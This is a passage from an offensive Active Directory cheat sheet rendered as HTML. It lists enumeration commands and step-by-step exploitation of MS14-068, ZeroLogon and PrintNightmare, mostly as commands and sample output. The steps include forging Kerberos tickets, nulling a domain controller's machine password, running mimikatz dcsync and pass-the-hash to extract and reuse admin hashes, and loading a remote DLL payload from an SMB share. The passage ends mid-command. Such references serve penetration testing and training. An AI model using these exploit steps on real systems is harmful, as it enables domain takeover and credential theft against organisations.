<p><strong>Enumerate Domain Users:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ADUser -Filter * -Identity &lt;user&gt; -Properties *
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Get a spesific &#34;string&#34; on a user&#39;s attribute</span>
</span></span><span style="display:flex;"><span>Get-ADUser -Filter <span style="color:#e6db74">&#39;Description -like &#34;*wtver*&#34;&#39;</span> -Properties Description | select Name, Description
</span></span></code></pre></div></li>
<li>
<p><strong>Enum Domain Computers:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ADComputer -Filter * -Properties *
</span></span><span style="display:flex;"><span>Get-ADGroup -Filter * 
</span></span></code></pre></div></li>
<li>
<p><strong>Enum Domain Trust:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ADTrust -Filter *
</span></span><span style="display:flex;"><span>Get-ADTrust -Identity &lt;DomainName&gt;
</span></span></code></pre></div></li>
<li>
<p><strong>Enum Forest Trust:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ADForest
</span></span><span style="display:flex;"><span>Get-ADForest -Identity &lt;ForestName&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Domains of Forest Enumeration</span>
</span></span><span style="display:flex;"><span>(Get-ADForest).Domains
</span></span></code></pre></div></li>
<li>
<p><strong>Enum Local AppLocker Effective Policy:</strong></p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
</span></span></code></pre></div><h3 id="other-interesting-commands">
  Other Interesting Commands
  <a class="anchor" href="#other-interesting-commands">#</a>
</h3>
<ul>
<li><strong>Find Domain Controllers</strong>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>nslookup domain.com
</span></span><span style="display:flex;"><span>nslookup -type=srv _ldap._tcp.dc._msdcs.&lt;domain&gt;.com
</span></span><span style="display:flex;"><span>nltest /dclist<span style="color:#960050;background-color:#1e0010">:</span>domain.com
</span></span><span style="display:flex;"><span>Get-ADDomainController -filter * | Select-Object name
</span></span><span style="display:flex;"><span>gpresult /r
</span></span><span style="display:flex;"><span>$Env:LOGONSERVER 
</span></span><span style="display:flex;"><span>echo <span style="color:#66d9ef">%</span>LOGONSERVER%
</span></span></code></pre></div></li>
</ul>
<h2 id="most-common-paths-to-ad-compromise">
  Most common paths to AD compromise
  <a class="anchor" href="#most-common-paths-to-ad-compromise">#</a>
</h2>
<h3 id="ms14-068-microsoft-kerberos-checksum-validation-vulnerability">
  MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)
  <a class="anchor" href="#ms14-068-microsoft-kerberos-checksum-validation-vulnerability">#</a>
</h3>
<p>This exploit require to know the user SID, you can use <code>rpcclient</code> to remotely get it or <code>wmi</code> if you have an access on the machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># remote</span>
</span></span><span style="display:flex;"><span>rpcclient $&gt; lookupnames john.smith
</span></span><span style="display:flex;"><span>john.smith S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">2923581646</span>-<span style="color:#ae81ff">3335815371</span>-<span style="color:#ae81ff">2872905324</span>-<span style="color:#ae81ff">1107</span> (User<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># loc</span>
</span></span><span style="display:flex;"><span>wmic useraccount get name,sid
</span></span><span style="display:flex;"><span>Administrator  S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">3415849876</span>-<span style="color:#ae81ff">833628785</span>-<span style="color:#ae81ff">5197346142</span>-<span style="color:#ae81ff">500</span>   
</span></span><span style="display:flex;"><span>Guest          S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">3415849876</span>-<span style="color:#ae81ff">833628785</span>-<span style="color:#ae81ff">5197346142</span>-<span style="color:#ae81ff">501</span>   
</span></span><span style="display:flex;"><span>Administrator  S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">297520375</span>-<span style="color:#ae81ff">2634728305</span>-<span style="color:#ae81ff">5197346142</span>-<span style="color:#ae81ff">500</span>   
</span></span><span style="display:flex;"><span>Guest          S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">297520375</span>-<span style="color:#ae81ff">2634728305</span>-<span style="color:#ae81ff">5197346142</span>-<span style="color:#ae81ff">501</span>   
</span></span><span style="display:flex;"><span>krbtgt         S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">297520375</span>-<span style="color:#ae81ff">2634728305</span>-<span style="color:#ae81ff">5197346142</span>-<span style="color:#ae81ff">502</span>   
</span></span><span style="display:flex;"><span>lambda         S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">297520375</span>-<span style="color:#ae81ff">2634728305</span>-<span style="color:#ae81ff">5197346142</span>-<span style="color:#ae81ff">1110</span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># powerview</span>
</span></span><span style="display:flex;"><span>Convert-NameToSid high-sec-corp.localkrbtgt
</span></span><span style="display:flex;"><span>S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">2941561648</span>-<span style="color:#ae81ff">383941485</span>-<span style="color:#ae81ff">1389968811</span>-<span style="color:#ae81ff">502</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Doc: https://github.com/gentilkiwi/kekeo/wiki/ms14068
</span></span></code></pre></div><p>Generate a ticket with <code>metasploit</code> or <code>pykek</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Metasploit<span style="color:#960050;background-color:#1e0010">:</span> auxiliary/admin/kerberos/ms14_068_kerberos_checksum
</span></span><span style="display:flex;"><span>   Name      Current Setting                                Required  Description
</span></span><span style="display:flex;"><span>   ----      ---------------                                --------  -----------
</span></span><span style="display:flex;"><span>   DOMAIN    LABDOMAIN.LOCAL                                yes       The Domain (upper case) Ex<span style="color:#960050;background-color:#1e0010">:</span> DEMO.LOCAL
</span></span><span style="display:flex;"><span>   PASSWORD  P@ssw0rd                                       yes       The Domain User password
</span></span><span style="display:flex;"><span>   RHOSTS    <span style="color:#ae81ff">10.10</span>.10.10                                    yes       The target address range or CIDR identifier
</span></span><span style="display:flex;"><span>   RPORT     <span style="color:#ae81ff">88</span>                                             yes       The target port
</span></span><span style="display:flex;"><span>   Timeout   <span style="color:#ae81ff">10</span>                                             yes       The TCP timeout to establish connection and read data
</span></span><span style="display:flex;"><span>   USER      lambda                                         yes       The Domain User
</span></span><span style="display:flex;"><span>   USER_SID  S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">297520375</span>-<span style="color:#ae81ff">2634728305</span>-<span style="color:#ae81ff">5197346142</span>-<span style="color:#ae81ff">1106</span>  yes       The Domain User SID, Ex<span style="color:#960050;background-color:#1e0010">:</span> S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">1755879683</span>-<span style="color:#ae81ff">3641577184</span>-<span style="color:#ae81ff">3486455962</span>-<span style="color:#ae81ff">1000</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Alternative download: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek</span>
</span></span><span style="display:flex;"><span>$ git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/SecWiki/windows-kernel-exploits
</span></span><span style="display:flex;"><span>$ python ./ms14-<span style="color:#ae81ff">068</span>.py -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt; -p &lt;clearPassword&gt;
</span></span><span style="display:flex;"><span>$ python ./ms14-<span style="color:#ae81ff">068</span>.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">1473643419</span>-<span style="color:#ae81ff">774954089</span>-<span style="color:#ae81ff">2222329127</span>-<span style="color:#ae81ff">1110</span> -d adsdc02.lab.adsecurity.org
</span></span><span style="display:flex;"><span>$ python ./ms14-<span style="color:#ae81ff">068</span>.py -u john.smith@pwn3d.local -s S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">2923581646</span>-<span style="color:#ae81ff">3335815371</span>-<span style="color:#ae81ff">2872905324</span>-<span style="color:#ae81ff">1107</span> -d <span style="color:#ae81ff">192.168</span>.115.10
</span></span><span style="display:flex;"><span>$ python ms14-<span style="color:#ae81ff">068</span>.py -u user01@metasploitable.local -d msfdc01.metasploitable.local -p Password1 -s S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">2928836948</span>-<span style="color:#ae81ff">3642677517</span>-<span style="color:#ae81ff">2073454066</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">-1105</span>
</span></span><span style="display:flex;"><span>  [+] Building AS-REQ <span style="color:#66d9ef">for</span> msfdc01.metasploitable.local... Done!
</span></span><span style="display:flex;"><span>  [+] Sending AS-REQ to msfdc01.metasploitable.local... Done!
</span></span><span style="display:flex;"><span>  [+] Receiving AS-REP from msfdc01.metasploitable.local... Done!
</span></span><span style="display:flex;"><span>  [+] Parsing AS-REP from msfdc01.metasploitable.local... Done!
</span></span><span style="display:flex;"><span>  [+] Building TGS-REQ <span style="color:#66d9ef">for</span> msfdc01.metasploitable.local... Done!
</span></span><span style="display:flex;"><span>  [+] Sending TGS-REQ to msfdc01.metasploitable.local... Done!
</span></span><span style="display:flex;"><span>  [+] Receiving TGS-REP from msfdc01.metasploitable.local... Done!
</span></span><span style="display:flex;"><span>  [+] Parsing TGS-REP from msfdc01.metasploitable.local... Done!
</span></span><span style="display:flex;"><span>  [+] Creating ccache file <span style="color:#e6db74">&#39;TGT_user01@metasploitable.local.ccache&#39;</span>... Done!
</span></span></code></pre></div><p>Then use <code>mimikatz</code> to load the ticket.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>mimikatz.exe <span style="color:#e6db74">&#34;kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache&#34;</span>
</span></span></code></pre></div><p>:warning: If the clock is skewed use <code>clock-skew.nse</code> script from <code>nmap</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Linux&gt; $ nmap -sV -sC <span style="color:#ae81ff">10.10</span>.10.10
</span></span><span style="display:flex;"><span>clock-skew<span style="color:#960050;background-color:#1e0010">:</span> mean<span style="color:#960050;background-color:#1e0010">:</span> -1998d09h03m04s, deviation<span style="color:#960050;background-color:#1e0010">:</span> 4h00m00s, median<span style="color:#960050;background-color:#1e0010">:</span> -1998d11h03m05s
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Linux&gt; sudo date -s <span style="color:#e6db74">&#34;14 APR 2015 18:25:16&#34;</span> 
</span></span><span style="display:flex;"><span>Windows&gt; net time /domain /set
</span></span></code></pre></div><h4 id="mitigations">
  Mitigations
  <a class="anchor" href="#mitigations">#</a>
</h4>
<ul>
<li>Ensure the DCPromo process includes a patch QA step before running DCPromo that checks for installation of KB3011780. The quick and easy way to perform this check is with PowerShell: get-hotfix 3011780</li>
</ul>
<h3 id="from-cve-to-system-shell-on-dc">
  From CVE to SYSTEM shell on DC
  <a class="anchor" href="#from-cve-to-system-shell-on-dc">#</a>
</h3>
<blockquote>
<p>Sometimes you will find a Domain Controller without the latest patches installed, use the newest CVE to gain a SYSTEM shell on it. If you have a &ldquo;normal user&rdquo; shell on the DC you can also try to elevate your privileges using one of the methods listed in <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">Windows - Privilege Escalation</a></p>
</blockquote>
<h4 id="zerologon">
  ZeroLogon
  <a class="anchor" href="#zerologon">#</a>
</h4>
<blockquote>
<p>CVE-2020-1472</p>
</blockquote>
<p>White Paper from Secura : <a href="https://www.secura.com/pathtoimg.php?id=2055">https://www.secura.com/pathtoimg.php?id=2055</a></p>
<p>Exploit steps from the white paper</p>
<ol>
<li>Spoofing the client credential</li>
<li>Disabling signing and sealing</li>
<li>Spoofing a call</li>
<li>Changing a computer&rsquo;s AD password to null</li>
<li>From password change to domain admin</li>
<li>:warning: reset the computer&rsquo;s AD password in a proper way to avoid any Deny of Service</li>
</ol>
<ul>
<li>
<p><code>cve-2020-1472-exploit.py</code> - Python script from <a href="https://github.com/dirkjanm">dirkjanm</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>  <span style="color:#75715e"># Check (https://github.com/SecuraBV/CVE-2020-1472)</span>
</span></span><span style="display:flex;"><span>  proxychains python3 zerologon_tester.py DC01 <span style="color:#ae81ff">172.16</span>.1.5
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/dirkjanm/CVE-<span style="color:#ae81ff">2020</span>-<span style="color:#ae81ff">1472</span>.git
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Activate a virtual env to install impacket</span>
</span></span><span style="display:flex;"><span>$ python3 -m venv venv
</span></span><span style="display:flex;"><span>$ source venv/bin/activate
</span></span><span style="display:flex;"><span>$ pip3 install .
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)</span>
</span></span><span style="display:flex;"><span>proxychains python3 cve-<span style="color:#ae81ff">2020</span>-<span style="color:#ae81ff">1472</span>-exploit.py DC01 <span style="color:#ae81ff">172.16</span>.1.5
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Find the old NT hash of the DC</span>
</span></span><span style="display:flex;"><span>proxychains secretsdump.py -history -just-dc-user <span style="color:#e6db74">&#39;DC01$&#39;</span> -hashes <span style="color:#960050;background-color:#1e0010">:</span>31d6cfe0d16ae931b73c59d7e0c089c0 <span style="color:#e6db74">&#39;CORP/DC01$@DC01.CORP.LOCAL&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Restore password from secretsdump </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># secretsdump will automatically dump the plaintext machine password (hex encoded) </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># when dumping the local registry secrets on the newest version</span>
</span></span><span style="display:flex;"><span>python restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip <span style="color:#ae81ff">172.16</span>.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3
</span></span><span style="display:flex;"><span>deactivate
</span></span></code></pre></div></li>
<li>
<p><code>nccfsas</code> - .NET binary for Cobalt Strike&rsquo;s execute-assembly</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/nccgroup/nccfsas
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check</span>
</span></span><span style="display:flex;"><span>execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Resetting the machine account password</span>
</span></span><span style="display:flex;"><span>execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Testing from a non Domain-joined machine</span>
</span></span><span style="display:flex;"><span>execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -patch
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Now reset the password back</span>
</span></span></code></pre></div></li>
<li>
<p><code>Mimikatz</code> - 2.2.0 20200917 Post-Zerologon</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>privilege::debug
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check for the CVE</span>
</span></span><span style="display:flex;"><span>lsadump::zerologon /target<span style="color:#960050;background-color:#1e0010">:</span>DC01.LAB.LOCAL /account<span style="color:#960050;background-color:#1e0010">:</span>DC01$
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit the CVE and set the computer account&#39;s password to &#34;&#34;</span>
</span></span><span style="display:flex;"><span>lsadump::zerologon /target<span style="color:#960050;background-color:#1e0010">:</span>DC01.LAB.LOCAL /account<span style="color:#960050;background-color:#1e0010">:</span>DC01$ /exploit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Execute dcsync to extract some hashes</span>
</span></span><span style="display:flex;"><span>lsadump::dcsync /domain<span style="color:#960050;background-color:#1e0010">:</span>LAB.LOCAL /dc<span style="color:#960050;background-color:#1e0010">:</span>DC01.LAB.LOCAL /user<span style="color:#960050;background-color:#1e0010">:</span>krbtgt /authuser<span style="color:#960050;background-color:#1e0010">:</span>DC01$ /authdomain<span style="color:#960050;background-color:#1e0010">:</span>LAB /authpassword<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;&#34;</span> /authntlm
</span></span><span style="display:flex;"><span>lsadump::dcsync /domain<span style="color:#960050;background-color:#1e0010">:</span>LAB.LOCAL /dc<span style="color:#960050;background-color:#1e0010">:</span>DC01.LAB.LOCAL /user<span style="color:#960050;background-color:#1e0010">:</span>Administrator /authuser<span style="color:#960050;background-color:#1e0010">:</span>DC01$ /authdomain<span style="color:#960050;background-color:#1e0010">:</span>LAB /authpassword<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;&#34;</span> /authntlm
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pass The Hash with the extracted Domain Admin hash</span>
</span></span><span style="display:flex;"><span>sekurlsa::pth /user<span style="color:#960050;background-color:#1e0010">:</span>Administrator /domain<span style="color:#960050;background-color:#1e0010">:</span>LAB /rc4<span style="color:#960050;background-color:#1e0010">:</span>HASH_NTLM_ADMIN
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Use IP address instead of FQDN to force NTLM with Windows APIs </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Reset password to Waza1234/Waza1234/Waza1234/</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L2584</span>
</span></span><span style="display:flex;"><span>lsadump::postzerologon /target<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">10.10</span>.10.10 /account<span style="color:#960050;background-color:#1e0010">:</span>DC01$
</span></span></code></pre></div></li>
<li>
<p><code>CrackMapExec</code> - only check</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>crackmapexec smb <span style="color:#ae81ff">10.10</span>.10.10 -u username -p password -d domain -M zerologon
</span></span></code></pre></div></li>
</ul>
<p>A 2nd approach to exploit zerologon is done by relaying authentication.</p>
<p>This technique, <a href="https://dirkjanm.io/a-different-way-of-abusing-zerologon">found by dirkjanm</a>, requires more prerequisites but has the advantage of having no impact on service continuity.
The following prerequisites are needed:</p>
<ul>
<li>A domain account</li>
<li>One DC running the <code>PrintSpooler</code> service</li>
<li>Another DC vulnerable to zerologon</li>
</ul>
<p><code>ntlmrelayx</code> - from Impacket and any tool such as <a href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py"><code>printerbug.py</code></a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Check if one DC is running the PrintSpooler service</span>
</span></span><span style="display:flex;"><span>rpcdump.py <span style="color:#ae81ff">10.10</span>.10.10 | grep -A <span style="color:#ae81ff">6</span> <span style="color:#e6db74">&#34;spoolsv&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Setup ntlmrelay in one shell</span>
</span></span><span style="display:flex;"><span>ntlmrelayx.py -t dcsync<span style="color:#960050;background-color:#1e0010">:</span>//DC01.LAB.LOCAL -smb2support
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Trigger printerbug in 2nd shell</span>
</span></span><span style="display:flex;"><span>python3 printerbug.py <span style="color:#e6db74">&#39;LAB.LOCAL&#39;</span>/joe<span style="color:#960050;background-color:#1e0010">:</span>Password123@10.10.10.10 <span style="color:#ae81ff">10.10</span>.10.12
</span></span></code></pre></div><h4 id="printnightmare">
  PrintNightmare
  <a class="anchor" href="#printnightmare">#</a>
</h4>
<blockquote>
<p>CVE-2021-1675 / CVE-2021-34527</p>
</blockquote>
<p>The DLL will be stored in <code>C:\Windows\System32\spool\drivers\x64\3\</code>.
The exploit will execute the DLL either from the local filesystem or a remote share.</p>
<p>Requirements:</p>
<ul>
<li><strong>Spooler Service</strong> enabled (Mandatory)</li>
<li>Server with patches &lt; June 2021</li>
<li>DC with <code>Pre Windows 2000 Compatibility</code> group</li>
<li>Server with registry key <code>HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoElevationOnInstall</code> = (DWORD) 1</li>
<li>Server with registry key <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA</code> = (DWORD) 0</li>
</ul>
<p><strong>Detect the vulnerability</strong>:</p>
<ul>
<li>Impacket - <a href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/rpcdump.py">rpcdump</a>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>python3 ./rpcdump.py @10.0.2.10 | egrep <span style="color:#e6db74">&#39;MS-RPRN|MS-PAR&#39;</span>
</span></span><span style="display:flex;"><span>Protocol<span style="color:#960050;background-color:#1e0010">:</span> [MS-RPRN]<span style="color:#960050;background-color:#1e0010">:</span> Print System Remote Protocol
</span></span></code></pre></div></li>
<li><a href="https://github.com/byt3bl33d3r/ItWasAllADream">It Was All A Dream</a>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/byt3bl33d3r/ItWasAllADream
</span></span><span style="display:flex;"><span>cd ItWasAllADream &amp;&amp; poetry install &amp;&amp; poetry shell
</span></span><span style="display:flex;"><span>itwasalladream -u user -p Password123 -d domain <span style="color:#ae81ff">10.10</span>.10.<span style="color:#ae81ff">10</span>/<span style="color:#ae81ff">24</span>
</span></span><span style="display:flex;"><span>docker run -it itwasalladream -u username -p Password123 -d domain <span style="color:#ae81ff">10.10</span>.10.10
</span></span></code></pre></div></li>
</ul>
<p><strong>Trigger the exploit</strong>:
<strong>Payload Hosting</strong>:</p>
<ul>
<li>The payload can be hosted on Impacket SMB server since <a href="https://github.com/SecureAuthCorp/impacket/pull/1109">PR #1109</a>:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>python3 ./smbserver.py share /tmp/smb/
</span></span></code></pre></div><ul>
<li>Using <a href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer/blob/main/Invoke-BuildAnonymousSMBServer.ps1">Invoke-BuildAnonymousSMBServer</a> (Admin rights required on host):</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Import-Module .\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\Share -Mode Enable
</span></span></code></pre></div><ul>
<li>Using WebDav with <a href="https://github.com/mgeeky/SharpWebServer">SharpWebServer</a> (Doesn&rsquo;t require admin rights):</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>SharpWebServer.exe port=<span style="color:#ae81ff">8888</span> dir=c:\users\public verbose=true
</span></span></code></pre></div><p>When using WebDav instead of SMB, you must add <code>@[PORT]</code> to the hostname in the URI, e.g.: <code>\\172.16.1.5@8888\Downloads\beacon.dll</code>
WebDav client <strong>must</strong> be activated on exploited target. By default it is not activated on Windows workstations (you have to <code>net start webclient</code>) and it&rsquo;s not installed on servers. Here is how to detect activated webdav:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>cme smb -u user -p password -d domain.local -M webdav [<span style="color:#66d9ef">TARGET</span>]
</span></span></code></pre></div><p><strong>NOTE</strong>: The payload can be hosted on Impacket SMB server since <a href="https://github.com/SecureAuthCorp/impacket/pull/1109">PR #1109</a>: <code>python3 ./smbserver.py share /tmp/smb/</code> or using <a href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer/blob/main/Invoke-BuildAnonymousSMBServer.ps1">Invoke-BuildAnonymousSMBServer</a> : <code>Import-Module .\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\Share -Mode Enable</code></p>
<ul>
<li><a href="https://github.com/cube0x0/CVE-2021-1675">SharpNightmare</a>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># require a modified Impacket: https://github.com/cube0x0/impacket</span>
</span></span><span style="display:flex;"><span>python3 ./CVE-<span style="color:#ae81ff">2021</span>-<span style="color:#ae81ff">1675</span>.py hackit.local/domain_user<span style="color:#960050;background-color:#1e0010">:</span>Pass123@192.168.1.10 <span style="color:#e6db74">&#39;\\192.168.1.215\smb\addCube.dll&#39;</span>
